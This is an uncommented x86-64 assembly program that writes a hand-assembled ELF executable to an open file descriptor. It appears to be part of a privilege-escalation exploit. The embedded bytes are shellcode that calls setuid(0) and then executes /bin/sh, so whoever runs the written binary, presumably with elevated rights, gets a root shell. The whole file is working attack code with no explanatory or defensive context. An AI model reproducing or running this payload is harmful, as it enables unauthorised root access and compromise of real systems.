.global _start
.text
_start:
mov     $header, %rsi
mov     $header_len,%rdx
mov     $0x3, %rdi
mov     $0x1, %rax
syscall

movl    $0x0, -0xc(%rbp)
jmp     CHECK1
LOOP1:
mov     $padding, %rsi
mov     $1, %rdx
mov     $0x3, %rdi
mov     $0x1, %rax
syscall
addl    $0x1,-0xc(%rbp)
CHECK1:
cmpl    $header_padding, -0xc(%rbp)
jle     LOOP1

mov     $txt, %rsi
mov     $txt_len,%rdx
mov     $0x3, %rdi
mov     $0x1, %rax
syscall

header:
.byte 0x7f,0x45,0x4c,0x46,0x2,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x2,0x0,0x3e,0x0,0x1,0x0,0x0,0x0,0x0,0x10,0x40,0x0,0x0,0x0,0x0,0x0
.byte 0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0x10,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x40,0x0,0x38,0x0,0x2,0x0,0x40,0x0,0x3,0x0,0x2,0x0
.byte 0x1,0x0,0x0,0x0,0x4,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0
.byte 0xb0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xb0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x5,0x0,0x0,0x0
.byte 0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x40,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x10,0x40,0x0,0x0,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0
header_len = . - header
header_padding = 4096 - header_len - 1
txt:
.byte 0x48,0x31,0xff,0xb0,0x69,0xf,0x5,0x48,0x31,0xd2,0x48,0xbb,0xff,0x2f,0x62,0x69
.byte 0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x8,0x53,0x48,0x89,0xe7,0x48,0x31,0xc0,0x50
.byte 0x57,0x48,0x89,0xe6,0xb0,0x3b,0xf,0x5,0x6a,0x1,0x5f,0x6a,0x3c,0x58,0xf,0x5
.byte 0x0,0x2e,0x73,0x68,0x73,0x74,0x72,0x74,0x61,0x62,0x0,0x2e,0x74,0x65,0x78,0x74
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xb,0x0,0x0,0x0,0x1,0x0,0x0,0x0
.byte 0x6,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x40,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x3,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x30,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x11,0x0,0x0,0x0,0x0,0x0,0x0,0x0
.byte 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0
txt_len = . - txt
txt_padding = 4096 - txt_len
padding:
.byte 0x00
